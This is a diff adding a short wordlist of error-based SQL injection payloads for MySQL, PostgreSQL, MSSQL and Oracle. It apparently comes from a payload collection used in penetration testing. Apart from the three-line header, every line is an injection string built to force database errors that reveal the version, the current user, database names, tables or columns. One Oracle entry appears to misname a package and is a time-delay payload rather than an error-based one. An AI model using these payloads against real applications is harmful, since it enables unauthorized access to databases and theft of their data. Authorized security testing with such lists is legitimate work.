@@ -1,0 +1,35 @@
+# SQL Injection - Error-based
+# Payloads that trigger database errors to leak information
+# Covers MySQL, PostgreSQL, MSSQL, Oracle
+' AND 1=CONVERT(int,(SELECT @@version))--
+' AND 1=CONVERT(int,(SELECT user()))--
+' AND 1=CONVERT(int,(SELECT db_name()))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1)--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT @@version),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version)),1)--
+' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT @@version))) USING utf8)))--
+' AND EXP(~(SELECT * FROM(SELECT @@version)x))--
+' AND 1=1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM (SELECT 1 UNION SELECT 2)a GROUP BY x LIMIT 1)--
+' AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))a)--
+' AND POLYGON((SELECT * FROM(SELECT * FROM(SELECT @@version)f)x))--
+' AND 1=CAST((SELECT @@version) AS int)--
+' AND 1=CAST((SELECT user()) AS int)--
+' AND 1=CAST((SELECT current_database()) AS int)--
+1' AND 1=CONVERT(int,@@version)--
+1' AND 1=CONVERT(int,db_name())--
+' AND (SELECT TOP 1 table_name FROM information_schema.tables)>0--
+' AND (SELECT TOP 1 column_name FROM information_schema.columns)>0--
+' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual)--
+' AND CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))--
+' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))--
+' AND 1=DBMS_PIPES.RECEIVE_MESSAGE(CHR(65)||CHR(66)||CHR(67),10)--
+' GROUP BY 1 HAVING 1=1--
+' HAVING 1=1--
+' ORDER BY 1--
+' ORDER BY 100--
